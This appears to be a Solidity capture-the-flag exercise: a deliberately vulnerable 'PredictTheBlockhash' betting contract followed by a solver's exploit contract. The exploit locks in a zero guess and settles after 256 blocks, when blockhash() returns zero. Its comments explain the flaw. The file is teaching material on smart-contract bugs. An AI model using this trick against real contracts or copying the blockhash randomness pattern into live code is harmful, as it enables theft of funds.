// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

//Challenge
contract PredictTheBlockhash {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(
            msg.value == 1 ether,
            "Requires 1 ether to create this contract"
        );
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "Requires msg.sender to be guesser");
        require(
            block.number > settlementBlockNumber,
            "Requires block.number to be more than settlementBlockNumber"
        );

        bytes32 answer = blockhash(settlementBlockNumber);

        guesser = address(0);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }
}

// Write your exploit contract below
contract ExploitContract {
    PredictTheBlockhash public predictTheBlockhash;

    // the key is pass correct `hash` when lockInGuess(uint). The answer = blockhash(block.number + 1), and the block is the block when call lockInGuess.
    // We can get the settlementBlockNumber, but the answer is build in function settle. Due to the result will be 0 if the blocknumber < currentBlockNumber - 256.
    // As such, it's a good idea to pass zero to lockInGuess, and settle it after (settlementBlockNumber + 256) blocks least. In other words, we should wait for 256+1 blocks after lockInGuess is called.
    // 

    constructor(PredictTheBlockhash _predictTheBlockhash) {
        predictTheBlockhash = _predictTheBlockhash;
    }

    function callLockInGuess() public payable{
        predictTheBlockhash.lockInGuess{value: 1 ether}(bytes32(0));
    }

    function settle() public {
        predictTheBlockhash.settle();
    }

    receive() external payable {}


    event Log(uint);
    // write your exploit code below
}
